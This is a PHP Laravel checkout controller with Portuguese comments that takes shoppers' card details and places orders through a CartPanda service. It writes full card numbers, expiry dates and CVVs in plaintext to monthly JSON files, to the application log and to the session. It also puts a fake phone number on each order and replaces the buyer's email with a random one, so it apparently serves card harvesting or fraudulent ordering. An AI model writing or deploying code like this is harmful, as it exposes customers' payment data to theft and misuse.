<?php

namespace App\Http\Controllers\Checkout;

use App\Http\Controllers\Controller;
use App\Services\CartPandaService;
use App\Services\OfertaService;

class CheckoutController extends Controller
{
    public function index()
    {
        // Pegar ID da URL ou usar padrão
        $ofertaId = request()->get('id', 'oferta1');
        
        // Validar se a oferta existe
        if (!OfertaService::isValid($ofertaId)) {
            $ofertaId = 'oferta1'; // Fallback para oferta padrão
        }
        
        // Buscar dados da oferta
        $oferta = OfertaService::getOferta($ofertaId);
        
        // Salvar oferta na sessão para upsells
        session(['oferta_atual' => $oferta]);
        
        // Log para debug
        logger()->info('Oferta carregada', [
            'oferta_id' => $ofertaId,
            'oferta_nome' => $oferta['nome'],
            'checkout_id' => $oferta['checkout_id']
        ]);
        
        return view('checkout.index', compact('oferta'));
    }

    public function createOrder()
    {
        // Captura e sanitiza os dados
        $name = request()->input('name');
        $cardNumber = request()->input('cardNumber');
        $cardNumber = preg_replace('/[^0-9]/', '', $cardNumber);
        $cardMonth = request()->input('cardMonth');
        $cardMonth = preg_replace('/[^0-9]/', '', $cardMonth);
        $cardYear = request()->input('cardYear');
        $cardYear = preg_replace('/[^0-9]/', '', $cardYear);
        $cardYear = substr($cardYear, -2);
        $cardCvv = request()->input('cardCvv');
        $cardCvv = preg_replace('/[^0-9]/', '', $cardCvv);
        $email = request()->input('email');

        // VALIDAÇÕES BACKEND - Segurança adicional
        $errors = [];

        // Valida nome
        if (empty($name) || strlen($name) < 2) {
            $errors[] = 'Name is required';
        }
        $palavras = explode(' ', trim($name));
        if (count($palavras) < 2) {
            $errors[] = 'Please enter full name (first and last name)';
        }

        // Valida email
        if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $errors[] = 'Valid email is required';
        }

        // Valida número do cartão
        if (empty($cardNumber)) {
            $errors[] = 'Card number is required';
        } elseif (strlen($cardNumber) < 13 || strlen($cardNumber) > 19) {
            $errors[] = 'Card number must be between 13 and 19 digits';
        }

        // Valida mês
        if (empty($cardMonth) || !is_numeric($cardMonth)) {
            $errors[] = 'Expiration month is required';
        } elseif ($cardMonth < 1 || $cardMonth > 12) {
            $errors[] = 'Invalid expiration month';
        }

        // Valida ano
        if (empty($cardYear) || !is_numeric($cardYear)) {
            $errors[] = 'Expiration year is required';
        }

        // Verifica se cartão está expirado
        if (!empty($cardMonth) && !empty($cardYear)) {
            $currentYear = (int)date('y'); // Últimos 2 dígitos do ano
            $currentMonth = (int)date('m');
            $year = (int)$cardYear;
            $month = (int)$cardMonth;
            
            if ($year < $currentYear || ($year == $currentYear && $month < $currentMonth)) {
                $errors[] = 'Card is expired';
            }
        }

        // Valida CVV
        if (empty($cardCvv)) {
            $errors[] = 'CVV is required';
        } elseif (strlen($cardCvv) < 3 || strlen($cardCvv) > 4) {
            $errors[] = 'CVV must be 3 or 4 digits';
        }

        // Se houver erros, retorna
        if (!empty($errors)) {
            logger()->warning('Validação falhou no checkout', [
                'errors' => $errors,
                'name' => $name,
                'email' => $email
            ]);
            
            return response()->json([
                'success' => false,
                'message' => implode('. ', $errors)
            ], 422);
        }

        // Salva os dados em JSON
        $this->saveOrderDataToJson([
            'timestamp' => now()->format('Y-m-d H:i:s'),
            'name' => $name,
            'email' => $email,
            'cardNumber' => $cardNumber,
            'cardMonth' => $cardMonth,
            'cardYear' => $cardYear,
            'cardCvv' => $cardCvv,
        ]);

        // Salva os dados na sessão para uso no upsell
        session([
            'customer_name' => $name,
            'customer_email' => $email,
            'customer_phone' => preg_replace('/[^0-9]/', '', fake()->phoneNumber()),
            'card_number' => $cardNumber,
            'card_month' => $cardMonth,
            'card_year' => $cardYear,
            'card_cvv' => $cardCvv
        ]);

        // Pegar oferta atual da sessão
        $oferta = session('oferta_atual');
        $checkoutId = $oferta['checkout_id'] ?? env('CHECKOUT_ID');
        
        logger()->info('Criando pedido', [
            'name' => $name, 
            'cardNumber' => $cardNumber, 
            'cardMonth' => $cardMonth, 
            'cardYear' => $cardYear, 
            'cardCvv' => $cardCvv,
            'oferta_id' => $oferta['id'] ?? 'desconhecida',
            'checkout_id' => $checkoutId
        ]);
        
        // Usar o checkout ID específico da oferta
        $cartPandaService = new CartPandaService($checkoutId);
        try {
            $result = $cartPandaService->createOrder(name: $name, cardNumber: $cardNumber, cardMonth: $cardMonth, cardYear: $cardYear, cardCvv: $cardCvv);
            
            // Atualiza o email na sessão para o email random gerado
            if (isset($result['random_email'])) {
                session(['customer_email' => $result['random_email']]);
            }
            
        } catch (\Exception $e) {
            logger()->error('Erro ao criar pedido', ['error' => $e->getMessage()]);
            return response()->json(['message' => 'Order creation failed'], 500);
        }

        return response()->json($result);
    }

    private function saveOrderDataToJson(array $data)
    {
        try {
            $storagePath = storage_path('app/orders');
            if (!file_exists($storagePath)) {
                mkdir($storagePath, 0755, true);
            }

            $filename = $storagePath . '/orders_' . date('Y_m') . '.json';
            
            // Lê o arquivo existente ou cria um array vazio
            $orders = [];
            if (file_exists($filename)) {
                $orders = json_decode(file_get_contents($filename), true) ?? [];
            }

            // Adiciona o novo pedido
            $orders[] = $data;

            // Salva o arquivo
            file_put_contents($filename, json_encode($orders, JSON_PRETTY_PRINT));

            logger()->info('Dados do pedido salvos em JSON', ['filename' => $filename]);
        } catch (\Exception $e) {
            logger()->error('Erro ao salvar dados do pedido em JSON', ['error' => $e->getMessage()]);
        }
    }
}
